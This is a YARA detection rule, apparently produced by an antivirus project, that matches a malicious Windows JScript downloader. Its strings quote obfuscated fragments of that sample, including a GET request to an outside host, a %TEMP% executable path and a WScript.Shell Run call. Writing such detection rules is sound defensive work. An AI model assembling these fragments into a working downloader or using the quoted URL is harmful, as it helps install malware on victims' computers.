rule sig_20160328_3ee53747e1ed40bf36f35926abc4ff31 {
  meta:
    description = "datamaliciousorder - file 20160328_3ee53747e1ed40bf36f35926abc4ff31.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e2b130e6e76c0017b59d8ce510392d5a50873176e548206ca0e7a5714aa22b2"

  strings:
    $s1  = "function Zcrurzcbnb() {return Qdqsciip[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1vPMTBWKSfIO1.exe\";};" fullword ascii
    $s2  = "Ogicgkl[Bwgvpwxisi](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Axrowin](Vbofbxxbej() * 11)} while (Ogicgkl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qdqsciip = function Kwsfnp() {return WScript[Souxoum](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Gfrgnubqpc(Bngodukn, Uqdnk){return Bngodukn - Uqdnk;};" fullword ascii
    $s6  = "function Kmvmxx(Ylfmmc){Qdqsciip[\"Run\"](Ylfmmc, Edsgl, Edsgl);};" fullword ascii
    $s7  = "function Usfdltjfaa() {return ((Dsgszcyqd == true) && (Dsgszcyqd == Qcjmkpgqi)) ? 1 : Edsgl;};" fullword ascii
    $s8  = "var Qcjmkpgqi = false;" fullword ascii
    $s9  = "var Prefosvxyg = new this[\"Date\"]();" fullword ascii
    $s10 = "function Vbofbxxbej(){return 22;};" fullword ascii
    $s11 = "function Kjiiswba(Egwte) {var Mfeype = (1, 2, 3, 4, 5, Egwte); return Mfeype;};" fullword ascii
    $s12 = "Qcjmkpgqi = true; " fullword ascii
    $s13 = "var Bgnzadnram = false;" fullword ascii
    $s14 = "Dsgszcyqd = true; " fullword ascii
    $s15 = "function Jswvsmsyhm(){return Ebbtnkptkg;};" fullword ascii
    $s16 = "var Dsgszcyqd = false;" fullword ascii
    $s17 = "function Khlbmn()" fullword ascii
    $s18 = "return Gfrgnubqpc(Hklqsdnf, Betlnbclt);" fullword ascii
    $s19 = "function Rzqtpnzus(){return Souxoum;};" fullword ascii
    $s20 = " while (Hsjhvsz){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}